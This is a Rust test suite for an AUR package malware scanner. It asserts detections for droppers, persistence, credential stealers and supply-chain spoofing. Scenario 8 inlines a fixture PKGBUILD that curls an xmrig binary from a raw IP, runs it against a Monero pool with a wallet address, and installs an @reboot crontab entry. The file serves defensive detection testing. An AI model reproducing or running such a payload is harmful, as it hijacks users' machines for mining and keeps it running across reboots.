mod common;

use aur_sentry::attest::{AttestInputs, build_attestation};
use aur_sentry::attestation::{Attestation, ReproducibilityStatus, Verdict};
use aur_sentry::findings::{Behavior, FileFindings};
use aur_sentry::report::{Advisory, write_advisories};
use common::*;

// =========================================================================
// Scenario 1: Benign Complex Package (google-chrome) - Zero False Positives
// =========================================================================

#[test]
fn test_scenario1_google_chrome_zero_false_positives() {
    let sandbox = TestSandbox::new("tier4_chrome");
    let pkgbuild = sandbox.write_file("PKGBUILD", BENIGN_GOOGLE_CHROME_PKGBUILD);

    // Step 1: Scan via CLI as opaque binary
    let output = run_aur_sentry(&["scan-file", pkgbuild.to_str().unwrap(), "--json"]);
    assert_eq!(
        output.code(),
        Some(0),
        "Benign google-chrome package must exit 0: {:?}",
        output.stderr
    );

    let file_findings: FileFindings = serde_json::from_str(&output.stdout).unwrap();
    let actionable: Vec<_> = file_findings
        .findings
        .into_iter()
        .filter(|f| f.severity != "INFO" && f.severity != "LOW")
        .collect();
    assert!(
        actionable.is_empty(),
        "Expected 0 actionable findings for google-chrome, but got: {:?}",
        actionable
    );

    // Step 2: Attestation synthesis with clean telemetry must produce Verified
    let out_attestation = sandbox.path().join("attestation.json");
    let static_findings = sandbox.write_file("static.json", "[]");

    let attest_output = run_aur_sentry(&[
        "attest",
        "google-chrome",
        "--version",
        "124.0.6367.60-1",
        "--pkgbuild",
        pkgbuild.to_str().unwrap(),
        "--static-findings",
        static_findings.to_str().unwrap(),
        "--output",
        out_attestation.to_str().unwrap(),
    ]);
    assert_eq!(attest_output.code(), Some(0));

    let att_content = std::fs::read_to_string(&out_attestation).unwrap();
    let att: Attestation = serde_json::from_str(&att_content).unwrap();
    assert_eq!(att.verdict, Verdict::Verified);
}

// =========================================================================
// Scenario 2: Historic AUR Malware Attack Chain (Acroread replica)
// =========================================================================

#[test]
fn test_scenario2_acroread_historic_malware_attack_chain() {
    let sandbox = TestSandbox::new("tier4_acroread");
    let pkgbuild = sandbox.write_file("PKGBUILD", MALICIOUS_ACROREAD_REPLICA);

    let output = run_aur_sentry(&["scan-file", pkgbuild.to_str().unwrap(), "--json"]);
    assert_eq!(
        output.code(),
        Some(2),
        "Malicious dropper must exit code 2: {:?}",
        output.stderr
    );

    let file_findings: FileFindings = serde_json::from_str(&output.stdout).unwrap();
    let rule_ids: Vec<_> = file_findings
        .findings
        .iter()
        .map(|f| f.rule_id.as_str())
        .collect();

    assert!(
        rule_ids.contains(&"EXFIL_RAW_IP"),
        "Must flag raw IP fetch in acroread replica"
    );
    assert!(
        rule_ids.contains(&"EXFIL_CURL_PIPE_EXEC") || rule_ids.contains(&"PIPELINE_FETCH_EXEC"),
        "Must flag curl piped into bash interpreter"
    );

    // Attestation pipeline verifies Malicious verdict
    let static_file = sandbox.write_file("static.json", &format!("[{}]", output.stdout));
    let out_att = sandbox.path().join("attestation.json");

    let attest_output = run_aur_sentry(&[
        "attest",
        "acroread-update",
        "--version",
        "9.5.5-1",
        "--pkgbuild",
        pkgbuild.to_str().unwrap(),
        "--static-findings",
        static_file.to_str().unwrap(),
        "--output",
        out_att.to_str().unwrap(),
    ]);
    assert_eq!(attest_output.code(), Some(2));

    let att_content = std::fs::read_to_string(&out_att).unwrap();
    let att: Attestation = serde_json::from_str(&att_content).unwrap();
    assert_eq!(att.verdict, Verdict::Malicious);
}

// =========================================================================
// Scenario 3: Privilege Escalation & Persistence Hijack
// =========================================================================

#[test]
fn test_scenario3_privilege_escalation_and_systemd_persistence() {
    let sandbox = TestSandbox::new("tier4_priv_esc");
    let pkgbuild = sandbox.write_file("PKGBUILD", MALICIOUS_PRIV_ESC_SYSTEMD);

    let output = run_aur_sentry(&["scan-file", pkgbuild.to_str().unwrap(), "--json"]);
    assert_eq!(output.code(), Some(2));

    let file_findings: FileFindings = serde_json::from_str(&output.stdout).unwrap();
    let rule_ids: Vec<_> = file_findings
        .findings
        .iter()
        .map(|f| f.rule_id.as_str())
        .collect();

    assert!(
        rule_ids.contains(&"PERSIST_SYSTEMD"),
        "Must detect systemd unit backdoor"
    );
    assert!(
        rule_ids.contains(&"PERSIST_CRON"),
        "Must detect crontab persistence injection"
    );
    assert!(
        rule_ids.contains(&"SUS_CHMOD_SUID"),
        "Must detect non-whitelisted SUID bit creation"
    );
}

// =========================================================================
// Scenario 4: Offline Attestation Verification & Registry Cache Resilience
// =========================================================================

#[test]
fn test_scenario4_offline_safeaur_workflow_resilience() {
    let sandbox = TestSandbox::new("tier4_offline_workflow");

    // 1. Check on unanalyzed package must not fail pre-build pipelines
    let check_output = run_aur_sentry(&["check", "unregistered-offline-tool"]);
    assert_eq!(
        check_output.code(),
        Some(0),
        "check on unanalyzed package must exit 0 to preserve build workflow"
    );

    // 2. Pre-populate local advisories cache in sandbox
    let advisory = Advisory {
        package: "offline-flagged-malware".into(),
        version: "1.0.0-1".into(),
        maintainer: "blackhat".into(),
        highest_severity: "CRITICAL".into(),
        detected_at: "2026-10-01T08:00:00Z".into(),
        findings: vec![],
        aur_url: "https://aur.archlinux.org/packages/offline-flagged-malware".into(),
    };
    write_advisories(sandbox.path(), &[advisory]);

    // 3. Radar run in that sandbox displays the local threat without network calls
    let radar_output = run_aur_sentry_in_dir(sandbox.path(), &["radar"]);
    assert_eq!(radar_output.code(), Some(0));
    assert!(
        radar_output.stderr.contains("offline-flagged-malware"),
        "Radar must report cached threats locally"
    );
}

// =========================================================================
// =========================================================================
// Scenario 5: Core System Primitive Spoofing Detection (Supply-Chain Attack)
// =========================================================================

#[test]
fn test_scenario5_core_system_primitive_spoofing_detection() {
    let client = aur_sentry::multisource::MultiSourceClient::new(true);

    // Dependency attempting to spoof core primitive glibc
    let dep = aur_sentry::deps::parse_dependency_spec(
        "glibc-backdoor",
        aur_sentry::deps::DependencyType::Depends,
        None,
    );
    let warnings = aur_sentry::deps::evaluate_dependency_threats(
        &dep,
        &aur_sentry::multisource::PackageOrigin::Aur,
        &client,
    );
    assert!(
        warnings.iter().any(|w| w.rule_id == "DEP_CORE_SPOOFING"),
        "Must flag dependency attempting to spoof core primitive glibc"
    );
}

// =========================================================================
// Scenario 6: Clean VCS Package with SKIP Hash - Zero False Positives
// =========================================================================

#[test]
fn test_scenario6_clean_vcs_package_zero_false_positives() {
    let sandbox = TestSandbox::new("tier4_vcs_clean");
    let pkgbuild = sandbox.write_file("PKGBUILD", BENIGN_VCS_GIT_PKGBUILD);

    let output = run_aur_sentry(&["scan-file", pkgbuild.to_str().unwrap(), "--json"]);
    assert_eq!(
        output.code(),
        Some(0),
        "Clean -git package with SKIP hash must exit 0: {:?}",
        output.stderr
    );

    let file_findings: FileFindings = serde_json::from_str(&output.stdout).unwrap();
    let actionable: Vec<_> = file_findings
        .findings
        .into_iter()
        .filter(|f| f.severity != "INFO" && f.severity != "LOW")
        .collect();
    assert!(
        actionable.is_empty(),
        "Expected 0 actionable findings on clean VCS package, got: {:?}",
        actionable
    );
}

// =========================================================================
// Scenario 7: Credential Stealer & Exfiltration Attack Chain
// =========================================================================

#[test]
fn test_scenario7_discord_credential_theft_and_exfiltration() {
    let sandbox = TestSandbox::new("tier4_credential_stealer");
    let pkgbuild = sandbox.write_file("PKGBUILD", MALICIOUS_DISCORD_STEALER);

    let output = run_aur_sentry(&["scan-file", pkgbuild.to_str().unwrap(), "--json"]);
    assert_eq!(output.code(), Some(2));

    let file_findings: FileFindings = serde_json::from_str(&output.stdout).unwrap();
    let cred_finding = file_findings
        .findings
        .iter()
        .find(|f| f.behavior == Behavior::CredentialAccess)
        .expect("Must have CredentialAccess finding");
    assert_eq!(cred_finding.rule_id, "CRED_BROWSER_PROFILES");

    let exfil_finding = file_findings
        .findings
        .iter()
        .find(|f| f.rule_id == "EXFIL_DISCORD_WEBHOOK")
        .expect("Must have Discord webhook finding");
    assert_eq!(exfil_finding.behavior, Behavior::NetworkAccess);

    // Attest pipeline evaluates CredentialAccess + NetworkAccess to Malicious
    let static_file = sandbox.write_file("static.json", &format!("[{}]", output.stdout));
    let inputs = AttestInputs {
        package: "discord-theme-dark".into(),
        version: "1.0.0-1".into(),
        arch: "any".into(),
        aur_commit: "".into(),
        pkgbuild_path: Some(&pkgbuild),
        install_path: None,
        static_findings_path: Some(&static_file),
        telemetry_path: None,
        install_telemetry_path: None,
        package_analysis_path: None,
        external_intelligence_path: None,
        strace_available: false,
        makepkg_exit: Some(0),
        scanner_version: "0.1.0".into(),
        reproducibility: ReproducibilityStatus::NotAttempted,
    };

    let att = build_attestation(&inputs);
    assert_eq!(att.verdict, Verdict::Malicious);
}

// =========================================================================
// Scenario 8: Stealth Cryptojacker Driver Campaign
// =========================================================================

#[test]
fn test_scenario8_cryptojacker_stealth_miner() {
    let sandbox = TestSandbox::new("tier4_miner");
    let miner_pkg = r#"
# Maintainer: Cryptojacker <crypto@evil.org>
pkgname=nvidia-patch-enhancer
pkgver=550.67
pkgrel=1
arch=('x86_64')
license=('custom')

package() {
    curl -s http://194.26.29.112/xmrig -o /tmp/xmrig
    chmod +x /tmp/xmrig
    /tmp/xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u 48edfHuPf1ed5st3WD626AZzp6FzPDQfvEQn9JuBaPhGPPCAh4rEXKZSiM8GnASxmrxveePtv8J73PhWDCKoHnACSc5h3TQ -p x &
    echo "@reboot /tmp/xmrig" | crontab -
}
"#;
    let pkgbuild = sandbox.write_file("PKGBUILD", miner_pkg);

    let output = run_aur_sentry(&["scan-file", pkgbuild.to_str().unwrap(), "--json"]);
    assert_eq!(output.code(), Some(2));

    let file_findings: FileFindings = serde_json::from_str(&output.stdout).unwrap();
    let rule_ids: Vec<_> = file_findings
        .findings
        .iter()
        .map(|f| f.rule_id.as_str())
        .collect();

    assert!(
        rule_ids.contains(&"MINER_XMRIG"),
        "Must detect xmrig / stratum mining indicator"
    );
    assert!(
        rule_ids.contains(&"MINER_WALLET_ADDR"),
        "Must detect Monero wallet address"
    );
    assert!(
        rule_ids.contains(&"PERSIST_CRON"),
        "Must detect crontab miner persistence"
    );
}
